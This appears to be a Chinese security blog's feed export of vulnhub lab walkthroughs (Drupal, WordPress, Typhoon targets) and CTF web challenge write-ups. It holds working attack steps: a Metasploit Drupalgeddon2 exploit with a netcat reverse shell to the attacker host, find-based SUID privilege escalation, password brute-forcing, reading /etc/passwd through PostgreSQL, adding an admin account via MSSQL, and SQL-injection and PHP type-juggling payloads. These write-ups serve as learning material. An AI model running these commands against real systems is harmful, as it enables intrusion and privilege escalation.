exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit [*] Started reverse TCP handler on 192.168.41.165:4444 [*] Sending stage (38247 bytes) to 192.168.41.168[*] Meterpreter session 1 opened (192.168.41.165:4444 -&gt; 192.168.41.168:41848) at 2019-08-09 09:48:32 -0400meterpreter &gt; meterpreter &gt; lsListing: /var/www=================Mode Size Type Last modified Name---- ---- ---- ------------- ----100644/rw-r--r-- 174 fil 2013-11-20 15:45:59 -0500 .gitignore100644/rw-r--r-- 5767 fil 2013-11-20 15:45:59 -0500 .htaccess 但是之后只能获得一个Meterpreter,不是root用户也没法运行Linux的常用命令，于是想到修改payload 123456msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set payload php/execpayload =&gt; php/execmsf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set CMD nc 192.168.41.165 2333 -c /bin/bashCMD =&gt; nc 192.168.41.165 2333 -c /bin/bashmsf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit 此时本机监听一个2333端口，成功反弹shell 123456789$ nc -lvp 2333 listening on [any] 2333 ...192.168.41.168: inverse host lookup failed: Unknown hostconnect to [192.168.41.165] from (UNKNOWN) [192.168.41.168] 60424lsCOPYRIGHT.txtINSTALL.mysql.txtINSTALL.pgsql.txtINSTALL.sqlite.txt 此时上提权辅助脚本： wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh 添加可执行权限并且运行，重点关注： 1234567891011121314151617181920[-] SUID files:-rwsr-xr-x 1 root root 88744 Dec 10 2012 /bin/mount-rwsr-xr-x 1 root root 31104 Apr 13 2011 /bin/ping-rwsr-xr-x 1 root root 35200 Feb 27 2017 /bin/su-rwsr-xr-x 1 root root 35252 Apr 13 2011 /bin/ping6-rwsr-xr-x 1 root root 67704 Dec 10 2012 /bin/umount-rwsr-sr-x 1 daemon daemon 50652 Oct 4 2014 /usr/bin/at-rwsr-xr-x 1 root root 35892 Feb 27 2017 /usr/bin/chsh-rwsr-xr-x 1 root root 45396 Feb 27 2017 /usr/bin/passwd-rwsr-xr-x 1 root root 30880 Feb 27 2017 /usr/bin/newgrp-rwsr-xr-x 1 root root 44564 Feb 27 2017 /usr/bin/chfn-rwsr-xr-x 1 root root 66196 Feb 27 2017 /usr/bin/gpasswd-rwsr-sr-x 1 root mail 83912 Nov 18 2017 /usr/bin/procmail-rwsr-xr-x 1 root root 162424 Jan 6 2012 /usr/bin/find-rwsr-xr-x 1 root root 937564 Feb 11 2018 /usr/sbin/exim4-rwsr-xr-x 1 root root 9660 Jun 20 2017 /usr/lib/pt_chown-rwsr-xr-x 1 root root 248036 Jan 27 2018 /usr/lib/openssh/ssh-keysign-rwsr-xr-x 1 root root 5412 Mar 28 2017 /usr/lib/eject/dmcrypt-get-device-rwsr-xr-- 1 root messagebus 321692 Feb 10 2015 /usr/lib/dbus-1.0/dbus-daemon-launch-helper-rwsr-xr-x 1 root root 84532 May 22 2013 /sbin/mount.nfs 但是此时并没有什么用，我们这里要讲的是用fing命令提权 find 之exec 随便创建一个文件touch anquanke 然后find查找并且加上-exec选项： 12find anquanke -exec &apos;whoami&apos; \;root 发现此时是root用户，于是执行/bin/sh 123find anquanke -exec &apos;/bin/sh&apos; \;whoamiroot 至此提权成功了 DC-6靶机——wordpress渗透 老规矩探测靶机的ip，然后扫描端口发现开放了80，按照下载时作者的提示需要修改hosts文件 12345678$ cat /etc/hosts127.0.0.1 localhost127.0.1.1 kali192.168.41.129 wordy# The following lines are desirable for IPv6 capable hosts::1 localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allrouters 之前kali上的wpscan有问题，更新镜像源重新升级了一下 wpscan --url http://wordy/ -e -t 20 直接扫一下看能有什么结果 扫描到用户： 12345678910111213141516171819202122232425[i] User(s) Identified:[+] admin | Detected By: Rss Generator (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection)[+] mark | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] sarah | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] jens | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] graham | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) 下一步根据上面下载地址处作者的提示，我们生产一个字典包 12# root @ kali in ~ [21:29:41] $ cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt 之后使用wpscan爆破密码，登陆后台开始提权 参考 Linux 反弹shell（二）反弹shell的本质 渗透测试实战-DC-1:1靶机入侵+Matrix2靶机入侵 渗透测试实战——DC-5+DC-6靶机入侵 Linux提权辅助脚本 Game-of-Thrones-CTF-1靶机复现 一个很有意思的靶机 扫描靶机ip地址 1234567# root @ kali in ~ [19:58:22] $ arp-scan 192.168.19.0/24Interface: eth0, datalink type: EN10MB (Ethernet)Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)192.168.19.2 00:50:56:f9:02:e9 VMware, Inc.192.168.19.131 00:0c:29:d0:e7:e1 VMware, Inc. ---&gt; 靶机192.168.19.254 00:50:56:e8:10:0e VMware, Inc. 扫描端口 1234567891011121314# root @ kali in ~ [19:59:38] $ masscan -p0-65535 192.168.19.131 --rate=1000000Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-10 23:59:47 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-ethInitiating SYN Stealth ScanScanning 1 hosts [65536 ports/host]Discovered open port 80/tcp on 192.168.19.131 Discovered open port 21/tcp on 192.168.19.131 Discovered open port 1337/tcp on 192.168.19.131 Discovered open port 10000/tcp on 192.168.19.131 Discovered open port 53/tcp on 192.168.19.131 Discovered open port 22/tcp on 192.168.19.131 Discovered open port 5432/tcp on 192.168.19.131 扫描端口对应的服务： 12345678910111213141516171819202122232425# root @ kali in ~ [20:00:24] $ nmap -sV -T4 192.168.19.131 Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-10 20:02 EDTStats: 0:01:36 elapsed; 0 hosts completed (1 up), 1 undergoing Service ScanService scan Timing: About 83.33% done; ETC: 20:04 (0:00:19 remaining)Nmap scan report for 192.168.19.131Host is up (0.000085s latency).Not shown: 992 closed portsPORT STATE SERVICE VERSION21/tcp open ftp?22/tcp open ssh Linksys WRT45G modified dropbear sshd (protocol 2.0)53/tcp open domain (unknown banner: Bind)80/tcp open http Apache httpd143/tcp filtered imap3306/tcp filtered mysql5432/tcp open postgresql PostgreSQL DB 9.6.4 - 9.6.610000/tcp open http MiniServ 1.590 (Webmin httpd)2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port21-TCP:V=7.70%I=7%D=8/10%Time=5D4F5B1F%P=x86_64-pc-linux-gnu%r(GeneSF:ricLines,11C,&quot;220-------------------------\r\n220-\&quot;These\x20are\x20theSF:\x20Dorne\x20city\x20walls\.\x20We\x20must\x20enter!\&quot;\x20-\x20Grey\x20SF:Worm\r\n220-\r\n220-\&quot;A\x20fail2ban\x20spell\x20is\x20protecting\x20theSF:se\x20walls\.\x20You&apos;ll\x20never\x20get\x20in\&quot;\x20-\x20One\x20of\x20th... 此时80端口是开放的，所以可以扫描一下目录： 123456789[20:04:36] 200 - 1KB - /favicon.ico[20:04:37] 301 - 232B - /h -&gt; http://192.168.19.131/h/[20:04:37] 200 - 3KB - /index.php/login/[20:04:37] 200 - 3KB - /index.php[20:04:37] 301 - 233B - /js -&gt; http://192.168.19.131/js/[20:04:38] 301 - 236B - /music -&gt; http://192.168.19.131/music/[20:04:40] 200 - 135B - /robots.txt[20:04:40] 403 - 222B - /server-status[20:04:40] 403 - 223B - /server-status/ robots.txt文件 依次访问这些页面，同时记得查看源代码，具体的分析之后再搞 1234 /the-tree/User-agent: *Disallow: /secret-island/Disallow: /direct-access-to-kings-landing/ 参考 Game-of-Thrones-CTF-1靶机完全攻略 DC-2靶机 同样的扫描靶机ip，然后扫描端口，之后扫描端口对应的服务 发现开放了80和7744端口 1234567891011121314# root @ kali in ~/dirsearch on git:master o [20:46:10] $ nmap -sV -p80,7744 192.168.19.132Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-10 20:47 EDTNmap scan report for 192.168.19.132Host is up (0.00046s latency).PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.10 ((Debian))7744/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)MAC Address: 00:0C:29:6A:1A:54 (VMware)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 6.62 seconds 然后修改hosts文件，打开网址发现又是一个wordpress flag页面提示用cewl命令生成一个字典 cewl -w dc2_passwords.txt http://dc-2 用wpscan扫描出用户名，然后再用wpscan爆破密码 wpscan --url http://dc-2/ -e -t 20 wpscan --url http://dc-2/ -U user.txt -P dc2_passwords.txt 123[i] Valid Combinations Found: | Username: jerry, Password: adipiscing | Username: tom, Password: parturient]]></content>
      <categories>
        <category>vulstudy</category>
      </categories>
      <tags>
        <tag>靶机</tag>
        <tag>nmap</tag>
        <tag>提权</tag>
        <tag>masscan</tag>
        <tag>find</tag>
        <tag>gobuster</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[typhoon靶机渗透]]></title>
    <url>%2F2019%2F08%2F09%2Ftyphoon%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[昨天晚上实战了一把，遇到了很多师傅，也积累了一些刷靶机的经验，虽然Windows那台靶机不知道是怎么回事，但是Linux那台还是玩的比较爽的。 今天又重新从 https://vulnhub.com 上把靶机搞下来装到Vmware上自己实验 靶机渗透之前也玩过，但是我每次发现自己都无法找到靶机的ip地址，这次重新实验了一下可以使用arp-scan和masscan工具 1234567891011# root @ kali in ~ [3:04:28] C:1$ arp-scan 192.168.41.0/24Interface: eth0, datalink type: EN10MB (Ethernet)Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)192.168.41.1 00:50:56:c0:00:08 VMware, Inc.192.168.41.2 00:50:56:e0:f7:aa VMware, Inc.192.168.41.166 00:0c:29:d7:ef:a4 VMware, Inc.192.168.41.254 00:50:56:f5:fb:f6 VMware, Inc.62 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.9.5: 256 hosts scanned in 7.212 seconds (35.50 hosts/sec). 4 responded 前两个是类似网关的，第四个是kali的ip，中间第三个就是靶机的ip地址 用masscan也可以发现,同时端口也可以扫出来 12345678910111213141516171819202122232425262728293031# root @ kali in ~ [3:04:28] C:1$ masscan -p0-65535 192.168.41.0/24 --rate=1000000Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-09 07:05:04 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-ethInitiating SYN Stealth ScanScanning 256 hosts [65536 ports/host]Discovered open port 631/tcp on 192.168.41.166 Discovered open port 139/tcp on 192.168.41.166 Discovered open port 80/tcp on 192.168.41.166 Discovered open port 22/tcp on 192.168.41.166 Discovered open port 5432/tcp on 192.168.41.166 Discovered open port 995/tcp on 192.168.41.166 Discovered open port 110/tcp on 192.168.41.166 Discovered open port 445/tcp on 192.168.41.166 Discovered open port 3306/tcp on 192.168.41.166 Discovered open port 27017/tcp on 192.168.41.166 Discovered open port 44337/tcp on 192.168.41.166 Discovered open port 6379/tcp on 192.168.41.166 Discovered open port 53/tcp on 192.168.41.2 Discovered open port 25/tcp on 192.168.41.166 Discovered open port 40811/tcp on 192.168.41.166 Discovered open port 33070/tcp on 192.168.41.166 Discovered open port 993/tcp on 192.168.41.166 Discovered open port 43074/tcp on 192.168.41.166 Discovered open port 21/tcp on 192.168.41.166 Discovered open port 53/tcp on 192.168.41.166 Discovered open port 2049/tcp on 192.168.41.166 Discovered open port 37535/tcp on 192.168.41.166 Discovered open port 8080/tcp on 192.168.41.166 Discovered open port 143/tcp on 192.168.41.166 nmap扫描最常用命令nmap -sV -A -p- ip可以扫描到靶机开放的端口和服务，当然那台靶机开放了好多好多个端口，需要记住一些常用的端口和它们对应的服务 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384Nmap scan report for 192.168.110.164Host is up (0.00034s latency).Not shown: 985 filtered portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.2|_ftp-anon: Anonymous FTP login allowed (FTP code 230)|_ftp-bounce: bounce working!| ftp-syst: | STAT: | FTP server status:| Connected to 192.168.110.72| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 2| vsFTPd 3.0.2 - secure, fast, stable|_End of status22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 1024 02:df:b3:1b:01:dc:5e:fd:f9:96:d7:5b:b7:d6:7b:f9 (DSA)| 2048 de:af:76:27:90:2a:8f:cf:0b:2f:22:f8:42:36:07:dd (RSA)| 256 70:ae:36:6c:42:7d:ed:1b:c0:40:fc:2d:00:8d:87:11 (ECDSA)|_ 256 bb:ce:f2:98:64:f7:8f:ae:f0:dd:3c:23:3b:a6:0f:61 (ED25519)25/tcp open smtp?|_smtp-commands: typhoon, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 53/tcp open domain ISC BIND 9.9.5-3 (Ubuntu Linux)| dns-nsid: |_ bind.version: 9.9.5-3-Ubuntu80/tcp open http Apache httpd 2.4.7 ((Ubuntu))| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS| http-robots.txt: 1 disallowed entry |_/mongoadmin/|_http-server-header: Apache/2.4.7 (Ubuntu)|_http-title: Typhoon Vulnerable VM by PRISMA CSI110/tcp open pop3 Dovecot pop3d|_pop3-capabilities: PIPELINING TOP AUTH-RESP-CODE STLS SASL CAPA UIDL RESP-CODES|_ssl-date: TLS randomness does not represent time111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100003 2,3,4 2049/tcp nfs| 100003 2,3,4 2049/udp nfs| 100005 1,2,3 43523/tcp mountd| 100005 1,2,3 58512/udp mountd| 100021 1,3,4 39728/udp nlockmgr| 100021 1,3,4 59010/tcp nlockmgr| 100024 1 39860/udp status| 100024 1 57414/tcp status| 100227 2,3 2049/tcp nfs_acl|_ 100227 2,3 2049/udp nfs_acl139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)143/tcp open imap Dovecot imapd (Ubuntu)|_imap-capabilities: OK more Pre-login have post-login listed capabilities IMAP4rev1 LOGINDISABLEDA0001 ID IDLE STARTTLS ENABLE LITERAL+ SASL-IR LOGIN-REFERRALS|_ssl-date: TLS randomness does not represent time445/tcp open netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)993/tcp open ssl/imaps?|_ssl-date: TLS randomness does not represent time995/tcp open ssl/pop3s?|_ssl-date: TLS randomness does not represent time2049/tcp open nfs_acl 2-3 (RPC #100227)3306/tcp open mysql?|_mysql-info: ERROR: Script execution failed (use -d to debug)8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1| http-methods: | Supported Methods: GET HEAD POST PUT DELETE OPTIONS|_ Potentially risky methods: PUT DELETE|_http-open-proxy: Proxy might be redirecting requests|_http-server-header: Apache-Coyote/1.1|_http-title: Apache TomcatWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: WAPRunning: Actiontec embedded, LinuxOS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernelOS details: Actiontec MI424WR-GEN3I WAPNetwork Distance: 2 hopsTCP Sequence Prediction: Difficulty=262 (Good luck!)IP ID Sequence Generation: IncrementalService Info: Host: TYPHOON; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel 同时还有一个扫描结果：以前似乎没有看到过 12345678910111213141516171819202122232425262728293031323334Host script results:|_clock-skew: mean: 6h59m59s, deviation: 1h43m54s, median: 7h59m58s| nbstat: NetBIOS name: TYPHOON, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| Names:| TYPHOON&lt;00&gt; Flags: &lt;unique&gt;&lt;active&gt;| TYPHOON&lt;03&gt; Flags: &lt;unique&gt;&lt;active&gt;| TYPHOON&lt;20&gt; Flags: &lt;unique&gt;&lt;active&gt;| \x01\x02__MSBROWSE__\x02&lt;01&gt; Flags: &lt;group&gt;&lt;active&gt;| WORKGROUP&lt;00&gt; Flags: &lt;group&gt;&lt;active&gt;| WORKGROUP&lt;1d&gt; Flags: &lt;unique&gt;&lt;active&gt;|_ WORKGROUP&lt;1e&gt; Flags: &lt;group&gt;&lt;active&gt;| smb-os-discovery: | OS: Unix (Samba 4.1.6-Ubuntu)| Computer name: typhoon| NetBIOS computer name: TYPHOON\x00| Domain name: local| FQDN: typhoon.local|_ System time: 2019-08-09T11:30:49+03:00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2019-08-09 04:30:48|_ start_date: N/ATRACEROUTE (using port 80/tcp)HOP RTT ADDRESS1 0.04 ms 192.168.41.22 0.17 ms 192.168.110.164 我最先打的是2049端口，因为这个端口对应的是nfs服务，用这条命令： nmap -sV --script=nfs-showmount ip扫出可以远程挂载的目录 之后尝试挂载，但是我无法用get命令将文件拷贝下来emmmm，主机也没有对应的挂载目录。 队友打了21号端口，但是信息也不是很多 22号端口是ssh服务，A组的师傅爆出了密码，参考安全客上的方法，可以先枚举用户名， 发现靶机名字为typhoon就想着去测试一下看看账号存不存在,利用ssh用户枚举漏洞进行测试 在GitHub上找了一个ssh_enum的脚本，尝试一下还行但是没有好字典 hydra可以爆破弱口令： hydra -l typhoon -P /usr/share/wordlist/metasploit/unix_passwords.txt ssh://192.168.56.150 第一次渗透感觉还不是很熟练，能够做到的就是这些😢 21号端口 search ftp_version收集ftp服务器的信息 12345msf5 auxiliary(scanner/ftp/ftp_version) &gt; exploit [+] 192.168.41.166:21 - FTP Banner: &apos;220 (vsFTPd 3.0.2)\x0d\x0a&apos;[*] 192.168.41.166:21 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed 如果这个版本的ftp有漏洞的话是不是可以getshell？ 浏览器直接访问并没有什么东西 尝试使用exploit/unix/ftp/vsftpd_234_backdoor进行渗透但是没成功 22端口 尝试枚举用户名为typhoon 成功枚举 使用hydra去爆破密码hydra -l typhoon -P /usr/share/wordlist/metasploit/unix_passwords.txt ssh://192.168.41.166 25端口smtp服务 获取到服务器的信息 12345msf5 auxiliary(scanner/smtp/smtp_version) &gt; exploit [+] 192.168.41.166:25 - 192.168.41.166:25 SMTP 220 typhoon ESMTP Postfix (Ubuntu)\x0d\x0a[*] 192.168.41.166:25 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed 5432端口postgresql服务 补充一点postgresql操作： 列出数据库\l： 12345678910postgres=# \l List of databases Name | Owner | Encoding | Collate | Ctype | Access privileges -----------+----------+----------+-------------+-------------+----------------------- postgres | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | template0 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres + | | | | | postgres=CTc/postgres template1 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres + | | | | | postgres=CTc/postgres(3 rows) 列出table'\d': 123456ostgres=# \d List of relations Schema | Name | Type | Owner --------+-------+-------+---------- public | mrlee | table | postgres(1 row) 之后使用metasploit的模块去收集信息 12345msf5 auxiliary(scanner/postgres/postgres_version) &gt; exploit [*] 192.168.41.166:5432 Postgres - Version PostgreSQL 9.3.4 on x86_64-unknown-linux-gnu, compiled by gcc (Ubuntu 4.8.2-16ubuntu6) 4.8.2, 64-bit (Post-Auth)[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed 直接发现弱口令 1234[-] 192.168.41.166:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)[-] 192.168.41.166:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)[+] 192.168.41.166:5432 - Login Successful: postgres:postgres@template1[-] 192.168.41.166:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password) 然后登陆 1234567# root @ kali in ~ [3:34:50] C:127$ psql -h 192.168.41.166 -U postgresPassword for user postgres: psql (11.2 (Debian 11.2-2), server 9.3.4)Type &quot;help&quot; for help.postgres=# help select pg_ls_dir('./');列出目录 1234567891011121314151617181920postgres=# select pg_ls_dir(&apos;./&apos;); pg_ls_dir ----------------- PG_VERSION pg_notify pg_multixact pg_subtrans pg_serial pg_snapshots pg_stat pg_clog pg_xlog base pg_twophase pg_tblspc global pg_stat_tmp postmaster.opts postmaster.pid(16 rows) 建表并且从/etc/passwd中拷贝数据过来再读取,（这个姿势第一次见） 1234567891011121314151617181920postgres=# DROP TABLE if EXISTS MrLee;NOTICE: table &quot;mrlee&quot; does not exist, skippingDROP TABLEpostgres=# CREATE TABLE MrLee(t TEXT);CREATE TABLEpostgres=# COPY MrLee FROM &apos;/etc/passwd&apos;;COPY 44postgres=# SELECT * FROM MrLee limit 1 offset 0; t --------------------------------- root:x:0:0:root:/root:/bin/bash(1 row)postgres=# SELECT * FROM MrLee; t ----------------------------------------------------------------------------------- root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin DC1靶机 姿势： find命令提权，hydra爆破，Drupal重置管理员密码 需要积累一些靶机渗透的经验 msf有好多的扫描工具在auxiliary模块里面，常用的ftp，ssh，smb，https msf各种弱口令爆破 同时需要熟悉find和grep命令 Linux find和grep命令 熟悉一下各种cms的常见姿势 忘记Drupal的管理员密码的解决办法 metasploit渗透mssql服务 1433端口对应于mssql服务，第一步一般是弱口令： use auxiliary/scanner/mssql/mssql_login 然后设置字典路径和远程主机即可 还可以使用auxiliary/scanner/mssql/mssql_ping进一步收集信息 之后尝试登陆mssql服务 use auxiliary/admin/mssql/mssql_exec 可以设置cmdset CMD cmd.exe /c net user 添加管理员用户，远程登陆： cmd.exe /c net user shenlan test /add&amp;net localgroup administrator shenlan /add 开启3389端口一般是提供远程桌面服务， 渗透之——Metasploit渗透MSSQL masscan扫描工具 扫描指定网络和端口： masscan.exe -p80 192.168.81.1/24 扫描指定主机所有开放的端口： masscan.exe -p0-65535 192.168.81.143 --banners可以获取服务器的banner信息 --echo选项将配置信息保存下来，这样可以下一次快速扫描 masscan.exe -p80,443,3306 192.168.81.143 --banners --echo&gt;1.conf 保存配置信息 masscan.exe -c 1.conf 读取配置信息 --rate提高扫描速度 渗透技巧：Windows平台运行Masscan和Nmap nmap高级使用技巧 nmap常见的扫描方式： 半开放扫描: -sS 没有建立三次握手连接，速度很快 全连接扫描：-sT 三次握手过程，速度较慢 扫描UDP端口： -sU]]></content>
      <categories>
        <category>vulstudy</category>
      </categories>
      <tags>
        <tag>靶机</tag>
        <tag>nfs</tag>
        <tag>nmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[实验吧web]]></title>
    <url>%2F2019%2F08%2F06%2F%E5%AE%9E%E9%AA%8C%E5%90%A7web%2F</url>
    <content type="text"><![CDATA[记录一下实验吧的wp 后台登陆 ctrl+u查看源码 123456789&lt;!-- $password=$_POST['password']; $sql = "SELECT * FROM admin WHERE username = 'admin' and password = '".md5($password,true)."'"; $result=mysqli_query($link,$sql); if(mysqli_num_rows($result)&gt;0)&#123; echo 'flag is :'.$flag; &#125; else&#123; echo '密码错误!'; &#125; --&gt; 一上来就问管理员密码，并且要求登陆，那么是爆破呢，还是爆破呢？ emmmmm其实这题的考点是md5的 查了一下官方文档，md5函数的第二个参数如果为true,那么就会返回原始16字符二进制格式 而且sql语句显然是可以拼接注入的，关键在于如何注入了 提供一个字符串： ffifdyop md5后，276f722736c95d99e921722cf9ed621c再转成字符串:' ' 'or' 6&lt;trach&gt;解析:存在 or 即代码的两边有一边为真既可以绕过，后面的其实为垃圾代码没有任何用的。or 后面有6，非零值即为真。既可以成功绕过。 http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php 当然看评论也有说密码就是e58的 参考 认真一点 http://ctf5.shiyanbar.com/web/earnest/index.php 这道题是盲注的题目，不太好搞 天下武功唯快不破 这个可以通过浏览器抓包，然后发现响应头中有一个FLAG字段显然是base64加密过的，解密之后就会得到提示，让你写脚本post提交 我写的垃圾代码如下： 1234567891011121314151617import urllibimport base64import requestsres = urllib.urlopen("http://ctf5.shiyanbar.com/web/10/10.php")head = str(res.headers)FLAG = head[head.index('FLAG')+6:head.index('FLAG')+48+6]flagBase64 = base64.decodestring(FLAG)TrueFlag = flagBase64[flagBase64.index(':')+1:]data = &#123;'key': TrueFlag&#125;res = requests.post(url='http://ctf5.shiyanbar.com/web/10/10.php', data=data)print res.content 师傅写的代码比我好看多了 12345678910111213# coding:utf8import requestsimport base64url = "http://ctf4.shiyanbar.com/web/10.php" # 目标URLs = requests.Session() # 获取 Sessionresponse = s.get(url) # 打开链接head = response.headers # 获取响应头flag = base64.b64decode(head['flag']).split(':')[1] # 获取相应头中的Flagprint flag # 打印FlagpostData = &#123;'key': flag&#125; # 构造Post请求体result = s.post(url=url, data=postData) # 利用Post方式发送请求# (注意要在同一个Session中 , 有的时候还需要设置Cookies , 但是此题不需要)print result.text # 打印响应内容 拐弯抹角 这个涉及到我的知识盲区，叫做伪静态页面 百度百科 payload 如下： http://ctf5.shiyanbar.com/indirection/index.php/a/index.php Forms 作为网络安全的人才，一定要仔细观察每一处地方 比如这个题目的表单： 12345&lt;form action="" method="post"&gt; PIN:&lt;br&gt; &lt;input type="password" name="PIN" value=""&gt; &lt;input type="hidden" name="showsource" value=0&gt; &lt;button type="submit"&gt;Enter&lt;/button&gt; 很明显看到，有一个hidden字段，而且是showsource,如果将其修改为1就能得到源码 源码如下： 12345678&lt;?php$a = $_POST["PIN"];if ($a == -19827747736161128312837161661727773716166727272616149001823847) &#123; echo "Congratulations! The flag is $flag";&#125; else &#123; echo "User with provided PIN not found.";&#125;?&gt; emmmm后面就不说了 天网管理系统 查看源码有隐藏字段 1&lt;!-- $test=$_GET['username']; $test=md5($test); if($test=='0') --&gt; 联想到php代码审计的小trick md5(QNKCDZO)得到的结果是0e开头的 得到提示， 访问http://ctf5.shiyanbar.com/10/web1/user.php?fame=hjkleffifer 得到： 1$unserialize_str = $_POST[&apos;password&apos;]; $data_unserialize = unserialize($unserialize_str); if($data_unserialize[&apos;user&apos;] == &apos;???&apos; &amp;&amp; $data_unserialize[&apos;pass&apos;]==&apos;???&apos;) &#123; print_r($flag); &#125; 伟大的科学家php方言道：成也布尔，败也布尔。 回去吧骚年 天真的我以为那三个问号就是真的问号 唉。。 12345678&lt;?php$a = array('user'=&gt;true, 'pass'=&gt;true);$b = serialize($a);$c = unserialize($b);var_dump($b);?&gt; 将这个作为password输入a:2:{s:4:&quot;user&quot;;b:1;s:4:&quot;pass&quot;;b:1;} 忘记密码 这个题目有点难度 不过还是要获取信息 查看源代码发现两处关键信息： 12&lt;meta name="admin" content="admin@simplexue.com" /&gt;&lt;meta name="editor" content="Vim" /&gt; 告诉了你管理员的邮箱和vim。。告诉我vim干嘛？当然是swp文件了 此处访问http://ctf5.shiyanbar.com/10/upload/.submit.php.swp可以得到swp文件 (这是通过抓包知道发现表单上传的就是这个文件，多试几次，记得在文件名前加*.*) 12345678910111213141516171819202122232425262728293031323334353637383940414243........这一行是省略的代码......../*如果登录邮箱地址不是管理员则 die()数据库结构---- 表的结构 `user`--CREATE TABLE IF NOT EXISTS `user` ( `id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(255) NOT NULL, `email` varchar(255) NOT NULL, `token` int(255) NOT NULL DEFAULT '0', PRIMARY KEY (`id`)) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;---- 转存表中的数据 `user`--INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES(1, '****不可见***', '***不可见***', 0);*/........这一行是省略的代码........if(!empty($token)&amp;&amp;!empty($emailAddress))&#123; if(strlen($token)!=10) die('fail'); if($token!='0') die('fail'); $sql = "SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"; $r = mysql_query($sql) or die('db error'); $r = mysql_fetch_assoc($r); $r = $r['num']; if($r&gt;0)&#123; echo $flag; &#125;else&#123; echo "失败了呀"; &#125;&#125; token是0e00000000即可绕过 payload如下： http://ctf5.shiyanbar.com/10/upload/submit.php?emailAddress=admin%40simplexue.com&amp;token=0e00000000]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>wp</tag>
        <tag>实验吧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows资源管理器神器]]></title>
